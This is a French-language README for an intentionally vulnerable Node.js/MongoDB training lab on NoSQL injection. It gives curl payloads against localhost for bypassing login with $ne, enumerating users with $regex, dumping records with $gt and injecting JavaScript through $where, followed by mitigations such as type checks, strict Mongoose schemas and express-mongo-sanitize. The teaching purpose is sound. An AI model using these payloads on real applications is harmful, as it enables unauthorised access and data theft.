📚 Description

Ce lab démontre les vulnérabilités d'injection NoSQL dans une application Node.js + MongoDB. L'application accepte des requêtes JSON non validées permettant l'injection d'opérateurs MongoDB pour contourner l'authentification et extraire des données sensibles.

🎯 Objectifs Pédagogiques

  1. Comprendre comment les injections NoSQL fonctionnent
  2. Identifier les points de vulnérabilité dans le code
  3. Exploiter les opérateurs MongoDB ($ne, $gt, $regex, $where)
  4. Apprendre à sécuriser les applications contre ces attaques

💡 Exemples d'Exploitation

1. Bypass d'authentification avec $ne

Objectif : Se connecter sans connaître le mot de passe

curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

2. Extraction ciblée avec $regex

Objectif : Énumérer les utilisateurs par force brute

curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"^a"},"password":{"$ne":null}}'

3. Opérateurs de comparaison

Objectif : Trouver tous les utilisateurs avec $gt

curl -X POST http://localhost:3000/search \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""}}'

4. JavaScript injection avec $where

Objectif : Exécuter du code JavaScript arbitraire

curl -X POST http://localhost:3000/advanced-search \
  -H "Content-Type: application/json" \
  -d '{"query":"this.username == '\''admin'\''"}'

🛡️ Comment se Protéger

1. Validation stricte du type

if (typeof username !== 'string' || typeof password !== 'string') {
  return res.status(400).json({ error: 'Invalid input type' });
}

2. Utiliser un ORM/ODM (Mongoose)

const userSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true }
}, { strict: true });

3. Sanitization avec express-mongo-sanitize

const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());
